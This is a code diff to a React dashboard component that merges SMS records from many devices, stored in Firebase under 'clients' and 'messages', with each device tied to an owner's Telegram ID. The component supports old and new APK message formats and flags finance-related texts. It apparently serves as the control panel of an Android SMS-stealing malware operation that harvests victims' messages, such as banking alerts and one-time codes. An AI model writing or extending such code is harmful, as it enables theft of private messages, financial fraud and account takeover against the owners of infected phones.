@@ -74,22 +74,54 @@ export function AllSms() {
   const [copiedKey, setCopiedKey] = useState<string | null>(null);
 
   useEffect(() => {
-    const clientsRef = ref(db, 'clients');
-    const unsubscribe = onValue(clientsRef, (snapshot) => {
-      if (!snapshot.exists()) { setAllSms([]); setLoading(false); return; }
-      const data = snapshot.val() as Record<string, any>;
+    // Fetch clients (for device meta: model, phone, ownerTelegramId)
+    // and messages (for SMS content) separately, then join.
+    let clientsData: Record<string, any> = {};
+    let messagesData: Record<string, any> = {};
+    let clientsReady = false;
+    let messagesReady = false;
+
+    function rebuild() {
+      if (!clientsReady || !messagesReady) return;
       const entries: SmsEntry[] = [];
 
-      Object.entries(data).forEach(([deviceId, device]) => {
-        if (!device.sms) return;
+      Object.entries(messagesData).forEach(([deviceId, smsList]) => {
+        const device = clientsData[deviceId] || {};
         // Per-user filter (non-admin only sees their own)
         if (!isAdmin && device.ownerTelegramId && device.ownerTelegramId !== userId) return;
+        if (!smsList || typeof smsList !== 'object') return;
+
+        Object.entries(smsList as Record<string, any>).forEach(([pushKey, sms]) => {
+          // Support new APK (sender/message/dateTime/id) and old APK (from/body/date)
+          const from = sms.sender || sms.from || 'Unknown';
+          const body = sms.message || sms.body || '';
+          // Use numeric id for sorting when available; fall back to date timestamp
+          const sortKey = sms.id != null ? sms.id : (sms.date ? parseInt(sms.date) : 0);
+          entries.push({
+            deviceId,
+            deviceModel: device.modelName || device.model || 'Unknown',
+            devicePhone: device.mobNo || device.phone || '',
+            pushKey,
+            from,
+            body,
+            date: sortKey,
+            isFinance: isFinance(body),
+          });
+        });
+      });
+
+      // Also include legacy sms stored under clients/{id}/sms
+      Object.entries(clientsData).forEach(([deviceId, device]) => {
+        if (!device.sms) return;
+        if (!isAdmin && device.ownerTelegramId && device.ownerTelegramId !== userId) return;
+        // Skip if already covered by messages path
+        if (messagesData[deviceId]) return;
 
         Object.entries(device.sms as Record<string, any>).forEach(([pushKey, sms]) => {
           entries.push({
             deviceId,
-            deviceModel: device.model || 'Unknown',
-            devicePhone: device.phone || '',
+            deviceModel: device.modelName || device.model || 'Unknown',
+            devicePhone: device.mobNo || device.phone || '',
             pushKey,
             from: sms.from || 'Unknown',
             body: sms.body || '',
@@ -99,12 +131,24 @@ export function AllSms() {
         });
       });
 
-      // Sort newest first
       entries.sort((a, b) => b.date - a.date);
       setAllSms(entries);
       setLoading(false);
+    }
+
+    const unsubClients = onValue(ref(db, 'clients'), (snap) => {
+      clientsData = snap.exists() ? snap.val() : {};
+      clientsReady = true;
+      rebuild();
     });
-    return () => unsubscribe();
+
+    const unsubMessages = onValue(ref(db, 'messages'), (snap) => {
+      messagesData = snap.exists() ? snap.val() : {};
+      messagesReady = true;
+      rebuild();
+    });
+
+    return () => { unsubClients(); unsubMessages(); };
   }, [isAdmin, userId]);
 
   const displayed = useMemo(() => {
